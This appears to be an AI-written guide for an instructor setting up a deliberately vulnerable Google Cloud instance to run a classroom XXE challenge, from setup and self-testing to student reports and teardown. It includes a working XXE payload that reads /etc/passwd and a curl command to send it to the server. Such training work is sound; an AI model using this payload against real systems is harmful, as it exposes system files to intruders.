To effectively demonstrate this complex security challenge to your students, you'll need to set up the environment, test the vulnerability yourself to understand it thoroughly, and prepare instructional materials or guidelines for the students. Below are the detailed steps you should follow:

---

## **1. Set Up the Vulnerable Environment**

### **a. Prerequisites**

- **Google Cloud Platform (GCP) Account**: Ensure you have administrative access to a GCP project.
- **Google Cloud SDK**: Install the [Google Cloud SDK](https://cloud.google.com/sdk/docs/install) on your local machine to use `gcloud` commands.
- **Billing Enabled**: Confirm that billing is enabled for your GCP project.

### **b. Save the Setup Script**

Create a file named `setup_complex_server.sh` and paste the provided script into it.

```bash
# Paste the script content here
```

### **c. Make the Script Executable**

Run the following command in your terminal to make the script executable:

```bash
chmod +x setup_complex_server.sh
```

### **d. Execute the Script**

Run the script to set up the instance:

```bash
./setup_complex_server.sh
```

- **Wait Time**: The setup may take several minutes. The instance will be named `complex-vulnerable-instance`.

### **e. Verify the Instance**

After the script completes:

- Go to the [Google Cloud Console](https://console.cloud.google.com/compute/instances).
- Locate the `complex-vulnerable-instance`.
- Note the **External IP address**; you'll need this later.

## **2. Test the Vulnerability Yourself**

Before presenting the challenge to your students, it's essential to understand the vulnerability fully.

### **a. Understand the XXE Vulnerability**

- **XML External Entity (XXE) Injection**: An attack that exploits vulnerable XML parsers to process external entities, allowing attackers to read files, perform SSRF, etc.
- **In Our Setup**: The Java servlet processes XML input without disabling external entity resolution.

### **b. Tools You'll Need**

- **HTTP Client**: Tools like **cURL**, **Postman**, or **Burp Suite**.
- **XML Knowledge**: Ability to craft custom XML payloads.

### **c. Craft a Malicious XML Payload**

Create a file named `malicious_payload.xml` with the following content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ELEMENT root ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>&xxe;</root>
```

- **Explanation**:
  - **DOCTYPE Declaration**: Introduces an external entity.
  - **&xxe;**: This entity will be replaced with the content of `/etc/passwd`.

### **d. Send the Payload to the Server**

Use `cURL` to send the malicious XML to the server:

```bash
curl -X POST -H "Content-Type: application/xml" --data @malicious_payload.xml http://<EXTERNAL_IP>/SOAPService
```

- Replace `<EXTERNAL_IP>` with the instance's external IP address.

### **e. Analyze the Response**

- **Expected Result**: The server should respond with the contents of the `/etc/passwd` file embedded in the XML response.
- **Troubleshooting**:
  - If you don't get the expected response, check firewall rules, ensure the service is running, and verify the endpoint.

### **f. Document Your Findings**

- Note the steps you took to exploit the vulnerability.
- Save any scripts or payloads used.

## **3. Prepare for Demonstration**

### **a. Create Instructional Material**

- **Challenge Description**: Provide a brief overview without revealing the vulnerability.
  - Example: "A web service is running on the provided server. Your task is to identify any vulnerabilities and exploit them to demonstrate potential security risks."
- **Rules and Guidelines**:
  - No destructive actions.
  - Limit testing to the provided server.
  - Document all steps taken.
- **Objectives**:
  - Identify open ports and services.
  - Discover any vulnerabilities.
  - Exploit the vulnerability ethically.

### **b. Set Up Monitoring (Optional)**

- Use tools like **Google Cloud Logging** to monitor the instance during the challenge.
- This helps you track activities and ensure students stay within scope.

### **c. Plan the Timeframe**

- Allocate **3 hours** for the challenge.
- Schedule the session and ensure the instance is running during this time.

---

## **4. Deliver the Challenge to Students**

### **a. Provide Necessary Information**

- **Server IP Address**: Share the external IP address.
- **Scope of Work**: Clarify that only ports 80 and 443 are open.
- **Time Limit**: Reinforce the 3-hour window.

### **b. Offer Available Resources**

- **Allowed Tools**: Inform them about permissible tools (e.g., Nmap, Burp Suite).
- **Reference Materials**: Encourage reviewing topics like web service testing, XML parsing vulnerabilities, and secure coding practices.

### **c. Emphasize Ethics and Legal Considerations**

- Remind students to adhere to ethical guidelines.
- Ensure they understand the importance of responsible disclosure and reporting.

## **5. Post-Challenge Activities**

### **a. Collect Reports from Students**

- Require a detailed report including:
  - Methodology.
  - Tools used.
  - Vulnerabilities found.
  - Exploitation steps.
  - Recommendations for remediation.

### **b. Review and Assess**

- Evaluate the students based on:
  - **Technical Findings**: Correct identification and exploitation.
  - **Understanding**: Depth of knowledge demonstrated.
  - **Approach**: Logical and systematic methodology.
  - **Documentation**: Clarity and professionalism in reporting.

### **c. Provide Feedback**

- Offer constructive feedback highlighting strengths and areas for improvement.
- Discuss the real-world implications of such vulnerabilities.

### **d. Terminate the Instance**

- After the challenge, delete the instance to prevent unauthorized access and reduce costs:

```bash
gcloud compute instances delete "complex-vulnerable-instance" --zone "us-central1-a"
```
